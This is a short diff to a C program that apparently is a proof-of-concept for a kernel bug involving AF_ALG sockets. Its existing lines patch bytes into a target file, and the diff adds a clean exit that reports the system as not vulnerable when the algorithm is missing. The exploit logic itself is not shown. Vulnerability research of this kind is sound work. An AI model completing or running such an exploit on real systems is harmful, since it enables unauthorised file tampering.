@@ -89,6 +89,12 @@ int main(int argc, char **argv) {
         fprintf(stderr, "[+] patch fd=%d off=%lld bytes=\"%s\"\n",
                 file_fd, (long long)off, window);
         if (patch_chunk(file_fd, off, window) < 0) {
+            if (errno == ENOENT) {
+                fprintf(stderr, "[-] AF_ALG algorithm not available; not vulnerable\n");
+                close(file_fd);
+                unlink(target);
+                return 0;
+            }
             fprintf(stderr, "[-] patch_chunk failed at offset %lld\n",
                     (long long)off);
             close(file_fd);
